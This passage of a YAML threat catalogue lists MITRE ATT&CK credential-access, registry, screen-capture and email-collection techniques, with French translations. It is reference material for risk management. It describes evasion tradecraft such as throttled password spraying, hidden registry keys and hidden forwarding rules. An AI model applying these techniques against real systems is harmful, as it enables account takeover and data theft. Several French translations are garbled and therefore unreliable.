          \ de connexion \xBB Windows 4625.\nhttps://attack.mitre.org/techniques/T1110/001"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1110.002
    ref_id: T1110.002
    name: Password Cracking
    description: "Adversaries may use password cracking to attempt to recover usable\
      \ credentials, such as plaintext passwords, when credential material such as\
      \ password hashes are obtained. [OS Credential Dumping](https://attack.mitre.org/techniques/T1003)\
      \ can be used to obtain password hashes, this may only get an adversary so far\
      \ when [Pass the Hash](https://attack.mitre.org/techniques/T1550/002) is not\
      \ an option. Further,  adversaries may leverage [Data from Configuration Repository](https://attack.mitre.org/techniques/T1602)\
      \ in order to obtain hashed credentials for network devices.(Citation: US-CERT-TA18-106A)\
      \ \n\nTechniques to systematically guess the passwords used to compute hashes\
      \ are available, or the adversary may use a pre-computed rainbow table to crack\
      \ hashes. Cracking hashes is usually done on adversary-controlled systems outside\
      \ of the target network.(Citation: Wikipedia Password cracking) The resulting\
      \ plaintext password resulting from a successfully cracked hash may be used\
      \ to log into systems, resources, and services in which the account has access.\n\
      https://attack.mitre.org/techniques/T1110/002"
    translations:
      fr:
        name: Craquage des mots de passe
        description: "Les adversaires peuvent utiliser le craquement des mots de passe\
          \ pour tenter de r\xE9cup\xE9rer des identifiants utilisables, tels que\
          \ les mots de passe en clair, lorsque des documents de validation tels que\
          \ des hachages de mots de passe sont obtenus. [D\xE9versement des identifiants\
          \ OS](https://attack.mitre.org/techniques/T1003) peut \xEAtre utilis\xE9\
          \ pour obtenir des hachages de mot de passe, cela ne peut permettre \xE0\
          \ un adversaire de s\u2019\xE9loigner que lorsque [Passer le hachage](https://attack.mitre.org/techniques/T1550/002)\
          \ n\u2019est pas une option. De plus, les adversaires peuvent exploiter\
          \ [Donn\xE9es du D\xE9p\xF4t de Configuration](https://attack.mitre.org/techniques/T1602)\
          \ afin d\u2019obtenir des identifiants hach\xE9s pour les appareils r\xE9\
          seau. (Citation : US-CERT-TA18-106A) \n\nDes techniques pour deviner syst\xE9\
          matiquement les mots de passe utilis\xE9s pour calculer les hachages sont\
          \ disponibles, ou l\u2019adversaire peut utiliser une table arc-en-ciel\
          \ pr\xE9-calcul\xE9e pour craquer les hachages. Le cracking des hachages\
          \ est g\xE9n\xE9ralement r\xE9alis\xE9 sur des syst\xE8mes contr\xF4l\xE9\
          s par l\u2019adversaire en dehors du r\xE9seau cible. (Citation : Cryptage\
          \ de mots de passe Wikip\xE9dia) Le mot de passe en clair r\xE9sultant d\u2019\
          un hachage r\xE9ussi peut \xEAtre utilis\xE9 pour se connecter aux syst\xE8\
          mes, ressources et services auxquels le compte a acc\xE8s.\nhttps://attack.mitre.org/techniques/T1110/002"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1110.003
    ref_id: T1110.003
    name: Password Spraying
    description: 'Adversaries may use a single or small list of commonly used passwords
      against many different accounts to attempt to acquire valid account credentials.
      Password spraying uses one password (e.g. ''Password01''), or a small list of
      commonly used passwords, that may match the complexity policy of the domain.
      Logins are attempted with that password against many different accounts on a
      network to avoid account lockouts that would normally occur when brute forcing
      a single account with many passwords. (Citation: BlackHillsInfosec Password
      Spraying)


      Typically, management services over commonly used ports are used when password
      spraying. Commonly targeted services include the following:


      * SSH (22/TCP)

      * Telnet (23/TCP)

      * FTP (21/TCP)

      * NetBIOS / SMB / Samba (139/TCP & 445/TCP)

      * LDAP (389/TCP)

      * Kerberos (88/TCP)

      * RDP / Terminal Services (3389/TCP)

      * HTTP/HTTP Management Services (80/TCP & 443/TCP)

      * MSSQL (1433/TCP)

      * Oracle (1521/TCP)

      * MySQL (3306/TCP)

      * VNC (5900/TCP)


      In addition to management services, adversaries may "target single sign-on (SSO)
      and cloud-based applications utilizing federated authentication protocols,"
      as well as externally facing email applications, such as Office 365.(Citation:
      US-CERT TA18-068A 2018)


      In order to avoid detection thresholds, adversaries may deliberately throttle
      password spraying attempts to avoid triggering security alerting. Additionally,
      adversaries may leverage LDAP and Kerberos authentication attempts, which are
      less likely to trigger high-visibility events such as Windows "logon failure"
      event ID 4625 that is commonly triggered by failed SMB connection attempts.(Citation:
      Microsoft Storm-0940)

      https://attack.mitre.org/techniques/T1110/003'
    translations:
      fr:
        name: "Pulv\xE9risation par mot de passe"
        description: "Les adversaires peuvent utiliser une seule ou une petite liste\
          \ de mots de passe couramment utilis\xE9s sur de nombreux comptes diff\xE9\
          rents pour tenter d\u2019obtenir des identifiants valides. La pulv\xE9risation\
          \ de mots de passe utilise un seul mot de passe (par exemple \xAB Password01\
          \ \xBB), ou une petite liste de mots de passe couramment utilis\xE9s, qui\
          \ peuvent correspondre \xE0 la politique de complexit\xE9 du domaine. Les\
          \ connexions sont tent\xE9es avec ce mot de passe sur de nombreux comptes\
          \ diff\xE9rents sur un r\xE9seau afin d\u2019\xE9viter les blocages de compte\
          \ qui surviendraient normalement lors de la force brute d\u2019un seul compte\
          \ avec plusieurs mots de passe. (Citation : Pulv\xE9risation de mots de\
          \ passe BlackHillsInfosec)\n\nEn g\xE9n\xE9ral, les services de gestion\
          \ sur les ports couramment utilis\xE9s sont utilis\xE9s lors de la manipulation\
          \ de mots de passe. Les services couramment cibl\xE9s incluent les suivants\
          \ :\n\n* SSH (22/TCP)\n* Telnet (23/TCP)\n* FTP (21/TCP)\n* NetBIOS / SMB\
          \ / Samba (139/TCP & 445/TCP)\n* LDAP (389/TCP)\n* Kerberos (88/TCP)\n*\
          \ RDP / Services terminaux (3389/TCP)\n* Services de gestion HTTP/HTTP (80/TCP\
          \ & 443/TCP)\n* MSSQL (1433/TCP)\n* Oracle (1521/TCP)\n* MySQL (3306/TCP)\n\
          * VNC (5900/TCP)\n\nEn plus des services de gestion, les adversaires peuvent\
          \ \xAB cibler des applications d\u2019authentification unique (SSO) et cloud\
          \ utilisant des protocoles d\u2019authentification f\xE9d\xE9r\xE9e \xBB\
          , ainsi que des applications de messagerie externes, telles qu\u2019Office\
          \ 365. (Citation : US-CERT TA18-068A 2018)\n\nAfin d\u2019\xE9viter les\
          \ seuils de d\xE9tection, les adversaires peuvent d\xE9lib\xE9r\xE9ment\
          \ limiter les tentatives de \xAB password spray \xBB afin d\u2019\xE9viter\
          \ de d\xE9clencher des alertes de s\xE9curit\xE9. De plus, les adversaires\
          \ peuvent utiliser les tentatives d\u2019authentification LDAP et Kerberos,\
          \ qui sont moins susceptibles de d\xE9clencher des \xE9v\xE9nements tr\xE8\
          s visibles comme l\u2019ID d\u2019\xE9chec de connexion Windows 4625, souvent\
          \ d\xE9clench\xE9 par des tentatives de connexion SMB rat\xE9es. (Citation\
          \ : Microsoft Storm-0940)\nhttps://attack.mitre.org/techniques/T1110/003"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1110.004
    ref_id: T1110.004
    name: Credential Stuffing
    description: 'Adversaries may use credentials obtained from breach dumps of unrelated
      accounts to gain access to target accounts through credential overlap. Occasionally,
      large numbers of username and password pairs are dumped online when a website
      or service is compromised and the user account credentials accessed. The information
      may be useful to an adversary attempting to compromise accounts by taking advantage
      of the tendency for users to use the same passwords across personal and business
      accounts.


      Credential stuffing is a risky option because it could cause numerous authentication
      failures and account lockouts, depending on the organization''s login failure
      policies.


      Typically, management services over commonly used ports are used when stuffing
      credentials. Commonly targeted services include the following:


      * SSH (22/TCP)

      * Telnet (23/TCP)

      * FTP (21/TCP)

      * NetBIOS / SMB / Samba (139/TCP & 445/TCP)

      * LDAP (389/TCP)

      * Kerberos (88/TCP)

      * RDP / Terminal Services (3389/TCP)

      * HTTP/HTTP Management Services (80/TCP & 443/TCP)

      * MSSQL (1433/TCP)

      * Oracle (1521/TCP)

      * MySQL (3306/TCP)

      * VNC (5900/TCP)


      In addition to management services, adversaries may "target single sign-on (SSO)
      and cloud-based applications utilizing federated authentication protocols,"
      as well as externally facing email applications, such as Office 365.(Citation:
      US-CERT TA18-068A 2018)

      https://attack.mitre.org/techniques/T1110/004'
    translations:
      fr:
        name: "Bourrage de cr\xE9dentials"
        description: "Les adversaires peuvent utiliser des identifiants obtenus lors\
          \ de dumps de violations de comptes non li\xE9s pour acc\xE9der aux comptes\
          \ cibles via un chevauchement de cr\xE9dentiels. Parfois, un grand nombre\
          \ de paires de noms d\u2019utilisateur et de mots de passe sont mis en ligne\
          \ lorsqu\u2019un site web ou un service est compromis et que les identifiants\
          \ de compte utilisateur sont acc\xE8s. Ces informations peuvent \xEAtre\
          \ utiles \xE0 un adversaire tentant de compromettre les comptes en profitant\
          \ de la tendance des utilisateurs \xE0 utiliser les m\xEAmes mots de passe\
          \ entre comptes personnels et professionnels.\n\nLe remplissage des cr\xE9\
          dentaux est une option risqu\xE9e car il peut entra\xEEner de nombreux \xE9\
          checs d\u2019authentification et des blocages de compte, selon les politiques\
          \ de d\xE9faillance de connexion de l\u2019organisation.\n\nTypiquement,\
          \ les services de gestion sur les ports couramment utilis\xE9s sont utilis\xE9\
          s lors de l\u2019insertion des identifiants. Les services couramment cibl\xE9\
          s incluent les suivants :\n\n* SSH (22/TCP)\n* Telnet (23/TCP)\n* FTP (21/TCP)\n\
          * NetBIOS / SMB / Samba (139/TCP & 445/TCP)\n* LDAP (389/TCP)\n* Kerberos\
          \ (88/TCP)\n* RDP / Services terminaux (3389/TCP)\n* Services de gestion\
          \ HTTP/HTTP (80/TCP & 443/TCP)\n* MSSQL (1433/TCP)\n* Oracle (1521/TCP)\n\
          * MySQL (3306/TCP)\n* VNC (5900/TCP)\n\nEn plus des services de gestion,\
          \ les adversaires peuvent \xAB cibler des applications d\u2019authentification\
          \ unique (SSO) et cloud utilisant des protocoles d\u2019authentification\
          \ f\xE9d\xE9r\xE9e \xBB, ainsi que des applications de messagerie externes,\
          \ telles qu\u2019Office 365. (Citation : US-CERT TA18-068A 2018)\nhttps://attack.mitre.org/techniques/T1110/004"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1111
    ref_id: T1111
    name: Multi-Factor Authentication Interception
    description: "Adversaries may target multi-factor authentication (MFA) mechanisms,\
      \ (i.e., smart cards, token generators, etc.) to gain access to credentials\
      \ that can be used to access systems, services, and network resources. Use of\
      \ MFA is recommended and provides a higher level of security than usernames\
      \ and passwords alone, but organizations should be aware of techniques that\
      \ could be used to intercept and bypass these security mechanisms. \n\nIf a\
      \ smart card is used for multi-factor authentication, then a keylogger will\
      \ need to be used to obtain the password associated with a smart card during\
      \ normal use. With both an inserted card and access to the smart card password,\
      \ an adversary can connect to a network resource using the infected system to\
      \ proxy the authentication with the inserted hardware token. (Citation: Mandiant\
      \ M Trends 2011)\n\nAdversaries may also employ a keylogger to similarly target\
      \ other hardware tokens, such as RSA SecurID. Capturing token input (including\
      \ a user's personal identification code) may provide temporary access (i.e.\
      \ replay the one-time passcode until the next value rollover) as well as possibly\
      \ enabling adversaries to reliably predict future authentication values (given\
      \ access to both the algorithm and any seed values used to generate appended\
      \ temporary codes). (Citation: GCN RSA June 2011)\n\nOther methods of MFA may\
      \ be intercepted and used by an adversary to authenticate. It is common for\
      \ one-time codes to be sent via out-of-band communications (email, SMS). If\
      \ the device and/or service is not secured, then it may be vulnerable to interception.\
      \ Service providers can also be targeted: for example, an adversary may compromise\
      \ an SMS messaging service in order to steal MFA codes sent to users\u2019 phones.(Citation:\
      \ Okta Scatter Swine 2022)\nhttps://attack.mitre.org/techniques/T1111"
    translations:
      fr:
        name: Interception par authentification multifactorielle
        description: "Les adversaires peuvent cibler des m\xE9canismes d\u2019authentification\
          \ multifacteurs (MFA) (c\u2019est-\xE0-dire des cartes \xE0 puce, des g\xE9\
          n\xE9rateurs de jetons, etc.) pour acc\xE9der \xE0 des identifiants pouvant\
          \ \xEAtre utilis\xE9s pour acc\xE9der \xE0 des syst\xE8mes, services et\
          \ ressources r\xE9seau. L\u2019utilisation de la MFA est recommand\xE9e\
          \ et offre un niveau de s\xE9curit\xE9 sup\xE9rieur aux seuls noms d\u2019\
          utilisateur et mots de passe, mais les organisations doivent \xEAtre conscientes\
          \ des techniques pouvant \xEAtre utilis\xE9es pour intercepter et contourner\
          \ ces m\xE9canismes de s\xE9curit\xE9. \n\nSi une carte \xE0 puce est utilis\xE9\
          e pour l\u2019authentification multifacteur, un enregistreur de frappe devra\
          \ \xEAtre utilis\xE9 pour obtenir le mot de passe associ\xE9 \xE0 une carte\
          \ \xE0 puce lors d\u2019une utilisation normale. Avec une carte ins\xE9\
          r\xE9e et un acc\xE8s au mot de passe de la carte \xE0 puce, un adversaire\
          \ peut se connecter \xE0 une ressource r\xE9seau en utilisant le syst\xE8\
          me infect\xE9 pour proxy l\u2019authentification avec le jeton mat\xE9riel\
          \ ins\xE9r\xE9. (Citation : Mandiant M Trends 2011)\n\nLes adversaires peuvent\
          \ \xE9galement utiliser un enregistreur de frappes pour cibler de mani\xE8\
          re similaire d\u2019autres jetons mat\xE9riels, tels que RSA SecurID. La\
          \ capture de l\u2019entr\xE9e du jeton (y compris le code d\u2019identification\
          \ personnel de l\u2019utilisateur) peut fournir un acc\xE8s temporaire (c\u2019\
          est-\xE0-dire rejouer le code d\u2019acc\xE8s \xE0 usage unique jusqu\u2019\
          au prochain rollover de valeur) ainsi que permettre aux adversaires de pr\xE9\
          dire de mani\xE8re fiable les valeurs futures d\u2019authentification (\xE0\
          \ condition d\u2019avoir acc\xE8s \xE0 la fois \xE0 l\u2019algorithme et\
          \ \xE0 toute valeur de d\xE9part utilis\xE9e pour g\xE9n\xE9rer des codes\
          \ temporaires ajout\xE9s). (Citation : GCN RSA juin 2011)\n\nD\u2019autres\
          \ m\xE9thodes de MFA peuvent \xEAtre intercept\xE9es et utilis\xE9es par\
          \ un adversaire pour authentifier. Il est courant que des codes \xE0 usage\
          \ unique soient envoy\xE9s via des communications hors bande (email, SMS).\
          \ Si l\u2019appareil et/ou le service n\u2019est pas s\xE9curis\xE9, il\
          \ peut alors \xEAtre vuln\xE9rable \xE0 l\u2019interception. Les fournisseurs\
          \ de services peuvent \xE9galement \xEAtre cibl\xE9s : par exemple, un adversaire\
          \ peut compromettre un service de messagerie SMS afin de voler les codes\
          \ MFA envoy\xE9s aux t\xE9l\xE9phones des utilisateurs. (Citation : Okta\
          \ Scatter Swine 2022)\nhttps://attack.mitre.org/techniques/T1111"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1112
    ref_id: T1112
    name: Modify Registry
    description: 'Adversaries may interact with the Windows Registry as part of a
      variety of other techniques to aid in defense evasion, persistence, and execution.


      Access to specific areas of the Registry depends on account permissions, with
      some keys requiring administrator-level access. The built-in Windows command-line
      utility [Reg](https://attack.mitre.org/software/S0075) may be used for local
      or remote Registry modification.(Citation: Microsoft Reg) Other tools, such
      as remote access tools, may also contain functionality to interact with the
      Registry through the Windows API.


      The Registry may be modified in order to hide configuration information or malicious
      payloads via [Obfuscated Files or Information](https://attack.mitre.org/techniques/T1027).(Citation:
      Unit42 BabyShark Feb 2019)(Citation: Avaddon Ransomware 2021)(Citation: Microsoft
      BlackCat Jun 2022)(Citation: CISA Russian Gov Critical Infra 2018) The Registry
      may also be modified to impair defenses, such as by enabling macros for all
      Microsoft Office products, allowing privilege escalation without alerting the
      user, increasing the maximum number of allowed outbound requests, and/or modifying
      systems to store plaintext credentials in memory.(Citation: CISA LockBit 2023)(Citation:
      Unit42 BabyShark Feb 2019)


      The Registry of a remote system may be modified to aid in execution of files
      as part of lateral movement. It requires the remote Registry service to be running
      on the target system.(Citation: Microsoft Remote) Often [Valid Accounts](https://attack.mitre.org/techniques/T1078)
      are required, along with access to the remote system''s [SMB/Windows Admin Shares](https://attack.mitre.org/techniques/T1021/002)
      for RPC communication.


      Finally, Registry modifications may also include actions to hide keys, such
      as prepending key names with a null character, which will cause an error and/or
      be ignored when read via [Reg](https://attack.mitre.org/software/S0075) or other
      utilities using the Win32 API.(Citation: Microsoft Reghide NOV 2006) Adversaries
      may abuse these pseudo-hidden keys to conceal payloads/commands used to maintain
      persistence.(Citation: TrendMicro POWELIKS AUG 2014)(Citation: SpectorOps Hiding
      Reg Jul 2017)

      https://attack.mitre.org/techniques/T1112'
    translations:
      fr:
        name: Modifier le registre
        description: "Les adversaires peuvent interagir avec le Registre Windows dans\
          \ le cadre d\u2019une vari\xE9t\xE9 d\u2019autres techniques pour faciliter\
          \ l\u2019\xE9vasion de la d\xE9fense, la persistance et l\u2019ex\xE9cution.\n\
          \nL\u2019acc\xE8s \xE0 des zones sp\xE9cifiques du Registre d\xE9pend des\
          \ autorisations du compte, certaines cl\xE9s n\xE9cessitant un acc\xE8s\
          \ au niveau administrateur. L\u2019utilitaire int\xE9gr\xE9 en ligne de\
          \ commande Windows [Reg](https://attack.mitre.org/software/S0075) peut \xEA\
          tre utilis\xE9 pour la modification locale ou distante du Registre. (Citation\
          \ : R\xE8glement Microsoft) D\u2019autres outils, tels que les outils d\u2019\
          acc\xE8s \xE0 distance, peuvent \xE9galement contenir des fonctionnalit\xE9\
          s permettant d\u2019interagir avec le Registre via l\u2019API Windows.\n\
          \nLe Registre peut \xEAtre modifi\xE9 afin de masquer des informations de\
          \ configuration ou des charges utiles malveillantes via [Fichiers ou informations\
          \ obfusqu\xE9s](https://attack.mitre.org/techniques/T1027). (Citation :\
          \ Unit42 BabyShark f\xE9vrier 2019)(Citation : Ransomware Avaddon 2021)(Citation\
          \ : Microsoft BlackCat juin 2022)(Citation : CISA Russian Government Critical\
          \ Infra 2018) Le Registre peut \xE9galement \xEAtre modifi\xE9 pour compromettre\
          \ les d\xE9fenses, par exemple en activant des macros pour tous les produits\
          \ Microsoft Office, en permettant l\u2019escalade de privil\xE8ges sans\
          \ alerter l\u2019utilisateur, en augmentant le nombre maximal de requ\xEA\
          tes sortantes autoris\xE9es, et/ou en modifiant les syst\xE8mes pour stocker\
          \ les identifiants en clair en m\xE9moire. (Citation : CISA LockBit 2023)(Citation\
          \ : Unit42 BabyShark f\xE9vrier 2019)\n\nLe registre d\u2019un syst\xE8\
          me distant peut \xEAtre modifi\xE9 pour faciliter l\u2019ex\xE9cution des\
          \ fichiers dans le cadre des d\xE9placements lat\xE9raux. Il n\xE9cessite\
          \ que le service Registre distant soit en cours sur le syst\xE8me cible.\
          \ (Citation : T\xE9l\xE9commande Microsoft) Souvent, des [Comptes valides](https://attack.mitre.org/techniques/T1078)\
          \ sont requis, ainsi qu\u2019un acc\xE8s aux [SMB/Windows Admin Shares](https://attack.mitre.org/techniques/T1021/002)\
          \ du syst\xE8me distant pour la communication RPC.\n\nEnfin, les modifications\
          \ du registre peuvent \xE9galement inclure des actions pour masquer les\
          \ cl\xE9s, comme pr\xE9poser des noms de cl\xE9s avec un caract\xE8re nul,\
          \ ce qui provoquera une erreur et/ou sera ignor\xE9 lors de lecture via\
          \ [Reg](https://attack.mitre.org/software/S0075) ou d\u2019autres utilitaires\
          \ utilisant l\u2019API Win32. (Citation : Microsoft Reghide NOV. 2006) Les\
          \ adversaires peuvent abuser de ces pseudo-cl\xE9s cach\xE9es pour dissimuler\
          \ des charges utiles/commandes utilis\xE9es pour maintenir la persistance.\
          \ (Citation : TrendMicro POWELIKS AO\xDBT 2014)(Citation : R\xE9giment SpectorOps\
          \ Hiding Juil 2017)\nhttps://attack.mitre.org/techniques/T1112"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1113
    ref_id: T1113
    name: Screen Capture
    description: 'Adversaries may attempt to take screen captures of the desktop to
      gather information over the course of an operation. Screen capturing functionality
      may be included as a feature of a remote access tool used in post-compromise
      operations. Taking a screenshot is also typically possible through native utilities
      or API calls, such as <code>CopyFromScreen</code>, <code>xwd</code>, or <code>screencapture</code>.(Citation:
      CopyFromScreen .NET)(Citation: Antiquated Mac Malware)

      https://attack.mitre.org/techniques/T1113'
    translations:
      fr:
        name: "Capture d\u2019\xE9cran"
        description: "Les adversaires peuvent tenter de prendre des captures d\u2019\
          \xE9cran du bureau pour recueillir des informations au cours d\u2019une\
          \ op\xE9ration. La fonctionnalit\xE9 de capture d\u2019\xE9cran peut \xEA\
          tre incluse dans un outil d\u2019acc\xE8s \xE0 distance utilis\xE9 lors\
          \ des op\xE9rations post-compromis. Prendre une capture d\u2019\xE9cran\
          \ est \xE9galement g\xE9n\xE9ralement possible via des utilitaires natifs\
          \ ou des appels API, tels que <code>CopyFromScreen</code>, <code>xwd</code>\
          \ ou <code>capture d\u2019\xE9cran</code>. (Citation : CopyFromScreen .NET)(Citation\
          \ : Malware Mac d\xE9su\xE8te)\nhttps://attack.mitre.org/techniques/T1113"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1114
    ref_id: T1114
    name: Email Collection
    description: 'Adversaries may target user email to collect sensitive information.
      Emails may contain sensitive data, including trade secrets or personal information,
      that can prove valuable to adversaries. Emails may also contain details of ongoing
      incident response operations, which may allow adversaries to adjust their techniques
      in order to maintain persistence or evade defenses.(Citation: TrustedSec OOB
      Communications)(Citation: CISA AA20-352A 2021) Adversaries can collect or forward
      email from mail servers or clients.

      https://attack.mitre.org/techniques/T1114'
    translations:
      fr:
        name: Collecte par e-mail
        description: "Les adversaires peuvent cibler les emails des utilisateurs pour\
          \ collecter des informations sensibles. Les courriels peuvent contenir des\
          \ donn\xE9es sensibles, y compris des secrets commerciaux ou des informations\
          \ personnelles, qui peuvent s\u2019av\xE9rer pr\xE9cieuses pour les adversaires.\
          \ Les courriels peuvent \xE9galement contenir des d\xE9tails sur les op\xE9\
          rations de r\xE9ponse aux incidents en cours, ce qui peut permettre aux\
          \ adversaires d\u2019ajuster leurs techniques afin de maintenir la persistance\
          \ ou d\u2019\xE9chapper aux d\xE9fenses. (Citation : TrustedSec OOB Communications)(Citation\
          \ : CISA AA20-352A 2021) Les adversaires peuvent collecter ou transf\xE9\
          rer des emails provenant de serveurs de messagerie ou de clients.\nhttps://attack.mitre.org/techniques/T1114"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1114.001
    ref_id: T1114.001
    name: Local Email Collection
    description: "Adversaries may target user email on local systems to collect sensitive\
      \ information. Files containing email data can be acquired from a user\u2019\
      s local system, such as Outlook storage or cache files.\n\nOutlook stores data\
      \ locally in offline data files with an extension of .ost. Outlook 2010 and\
      \ later supports .ost file sizes up to 50GB, while earlier versions of Outlook\
      \ support up to 20GB.(Citation: Outlook File Sizes) IMAP accounts in Outlook\
      \ 2013 (and earlier) and POP accounts use Outlook Data Files (.pst) as opposed\
      \ to .ost, whereas IMAP accounts in Outlook 2016 (and later) use .ost files.\
      \ Both types of Outlook data files are typically stored in `C:\\Users\\<username>\\\
      Documents\\Outlook Files` or `C:\\Users\\<username>\\AppData\\Local\\Microsoft\\\
      Outlook`.(Citation: Microsoft Outlook Files)\nhttps://attack.mitre.org/techniques/T1114/001"
    translations:
      fr:
        name: "Collecte locale d\u2019emails"
        description: "Les adversaires peuvent cibler les e-mails des utilisateurs\
          \ sur les syst\xE8mes locaux pour collecter des informations sensibles.\
          \ Les fichiers contenant des donn\xE9es d\u2019email peuvent \xEAtre obtenus\
          \ depuis le syst\xE8me local de l\u2019utilisateur, comme le stockage Outlook\
          \ ou les fichiers cache.\n\nOutlook stocke les donn\xE9es localement dans\
          \ des fichiers hors ligne avec une extension .ost. Outlook 2010 et versions\
          \ ult\xE9rieures prennent en charge des formats .ost jusqu\u2019\xE0 50\
          \ Go, tandis que les versions ant\xE9rieures d\u2019Outlook prennent en\
          \ charge jusqu\u2019\xE0 20 Go. (Citation : Tailles de fichiers Outlook)\
          \ Les comptes IMAP dans Outlook 2013 (et les versions ant\xE9rieures) et\
          \ POP utilisent les fichiers de donn\xE9es Outlook (.pst) au lieu de .ost,\
          \ tandis que les comptes IMAP dans Outlook 2016 (et les versions ult\xE9\
          rieures) utilisent des fichiers .ost. Les deux types de fichiers de donn\xE9\
          es Outlook sont g\xE9n\xE9ralement stock\xE9s dans 'C\_:\\Users\\<username>\\\
          Documents\\Outlook Files' ou 'C\_:\\Users\\<username>\\AppData\\Local\\\
          Microsoft\\Outlook'.( Citation : Fichiers Microsoft Outlook)\nhttps://attack.mitre.org/techniques/T1114/001"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1114.002
    ref_id: T1114.002
    name: Remote Email Collection
    description: 'Adversaries may target an Exchange server, Office 365, or Google
      Workspace to collect sensitive information. Adversaries may leverage a user''s
      credentials and interact directly with the Exchange server to acquire information
      from within a network. Adversaries may also access externally facing Exchange
      services, Office 365, or Google Workspace to access email using credentials
      or access tokens. Tools such as [MailSniper](https://attack.mitre.org/software/S0413)
      can be used to automate searches for specific keywords.

      https://attack.mitre.org/techniques/T1114/002'
    translations:
      fr:
        name: "Collecte de courriels \xE0 distance"
        description: "Les adversaires peuvent cibler un serveur Exchange, Office 365\
          \ ou Google Workspace pour collecter des informations sensibles. Les adversaires\
          \ peuvent exploiter les identifiants d\u2019un utilisateur et interagir\
          \ directement avec le serveur Exchange pour acqu\xE9rir des informations\
          \ au sein d\u2019un r\xE9seau. Les adversaires peuvent \xE9galement acc\xE9\
          der \xE0 des services Exchange externes, Office 365 ou Google Workspace\
          \ pour acc\xE9der \xE0 l\u2019email en utilisant des identifiants ou des\
          \ jetons d\u2019acc\xE8s. Des outils tels que [MailSniper](https://attack.mitre.org/software/S0413)\
          \ peuvent \xEAtre utilis\xE9s pour automatiser les recherches de mots-cl\xE9\
          s sp\xE9cifiques.\nhttps://attack.mitre.org/techniques/T1114/002"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1114.003
    ref_id: T1114.003
    name: Email Forwarding Rule
    description: "Adversaries may setup email forwarding rules to collect sensitive\
      \ information. Adversaries may abuse email forwarding rules to monitor the activities\
      \ of a victim, steal information, and further gain intelligence on the victim\
      \ or the victim\u2019s organization to use as part of further exploits or operations.(Citation:\
      \ US-CERT TA18-068A 2018) Furthermore, email forwarding rules can allow adversaries\
      \ to maintain persistent access to victim's emails even after compromised credentials\
      \ are reset by administrators.(Citation: Pfammatter - Hidden Inbox Rules) Most\
      \ email clients allow users to create inbox rules for various email functions,\
      \ including forwarding to a different recipient. These rules may be created\
      \ through a local email application, a web interface, or by command-line interface.\
      \ Messages can be forwarded to internal or external recipients, and there are\
      \ no restrictions limiting the extent of this rule. Administrators may also\
      \ create forwarding rules for user accounts with the same considerations and\
      \ outcomes.(Citation: Microsoft Tim McMichael Exchange Mail Forwarding 2)(Citation:\
      \ Mac Forwarding Rules)\n\nAny user or administrator within the organization\
      \ (or adversary with valid credentials) can create rules to automatically forward\
      \ all received messages to another recipient, forward emails to different locations\
      \ based on the sender, and more. Adversaries may also hide the rule by making\
      \ use of the Microsoft Messaging API (MAPI) to modify the rule properties, making\
      \ it hidden and not visible from Outlook, OWA or most Exchange Administration\
      \ tools.(Citation: Pfammatter - Hidden Inbox Rules)\n\nIn some environments,\
      \ administrators may be able to enable email forwarding rules that operate organization-wide\
      \ rather than on individual inboxes. For example, Microsoft Exchange supports\
      \ transport rules that evaluate all mail an organization receives against user-specified\
      \ conditions, then performs a user-specified action on mail that adheres to\
      \ those conditions.(Citation: Microsoft Mail Flow Rules 2023) Adversaries that\
      \ abuse such features may be able to enable forwarding on all or specific mail\
      \ an organization receives.\nhttps://attack.mitre.org/techniques/T1114/003"
    translations:
      fr:
        name: "R\xE8gle de transfert d\u2019e-mails"
        description: "Les adversaires peuvent mettre en place des r\xE8gles de transfert\
          \ d\u2019e-mails pour collecter des informations sensibles. Les adversaires\
          \ peuvent abuser des r\xE8gles de transfert de courriels pour surveiller\
          \ les activit\xE9s d\u2019une victime, voler des informations et obtenir\
          \ des renseignements sur la victime ou son organisation afin de les utiliser\
          \ dans le cadre de nouvelles op\xE9rations ou exploits. (Citation : US-CERT\
          \ TA18-068A 2018) De plus, les r\xE8gles de transfert d\u2019e-mails peuvent\
          \ permettre aux adversaires de maintenir un acc\xE8s persistant aux e-mails\
          \ des victimes m\xEAme apr\xE8s que les identifiants compromis ont \xE9\
          t\xE9 r\xE9initialis\xE9s par les administrateurs. (Citation : Pfammatter\
          \ - R\xE8gles de bo\xEEte de r\xE9ception cach\xE9e) La plupart des clients\
          \ de messagerie permettent aux utilisateurs de cr\xE9er des r\xE8gles de\
          \ bo\xEEte de r\xE9ception pour diverses fonctions de messagerie, y compris\
          \ le transfert vers un autre destinataire. Ces r\xE8gles peuvent \xEAtre\
          \ cr\xE9\xE9es via une application de messagerie locale, une interface web\
          \ ou une interface en ligne de commande. Les messages peuvent \xEAtre transf\xE9\
          r\xE9s \xE0 des destinataires internes ou externes, et aucune restriction\
          \ ne limite l\u2019\xE9tendue de cette r\xE8gle. Les administrateurs peuvent\
          \ \xE9galement cr\xE9er des r\xE8gles de transfert pour les comptes utilisateurs\
          \ avec les m\xEAmes consid\xE9rations et r\xE9sultats. (Citation : Microsoft\
          \ Tim McMichael Exchange Mailing Forwarding 2)(Citation : R\xE8gles de transfert\
          \ de Mac)\n\nTout utilisateur ou administrateur au sein de l\u2019organisation\
          \ (ou adversaire disposant d\u2019identifiants valides) peut cr\xE9er des\
          \ r\xE8gles pour transf\xE9rer automatiquement tous les messages re\xE7\
          us \xE0 un autre destinataire, transf\xE9rer les e-mails vers diff\xE9rents\
          \ endroits selon l\u2019exp\xE9diteur, et plus encore. Les adversaires peuvent\
          \ \xE9galement masquer la r\xE8gle en utilisant l\u2019API de messagerie\
          \ Microsoft (MAPI) pour modifier les propri\xE9t\xE9s de la r\xE8gle, la\
          \ rendant ainsi dissimul\xE9e et invisible depuis Outlook, OWA ou la plupart\
          \ des outils d\u2019administration d\u2019Exchange. (Citation : Pfammatter\
          \ - R\xE8gles de bo\xEEte de r\xE9ception cach\xE9e)\n\nDans certains environnements,\
          \ les administrateurs peuvent \xEAtre en mesure d\u2019activer des r\xE8\
          gles de transfert d\u2019e-mails qui fonctionnent \xE0 l\u2019\xE9chelle\
          \ de l\u2019organisation plut\xF4t que sur des bo\xEEtes de r\xE9ception\
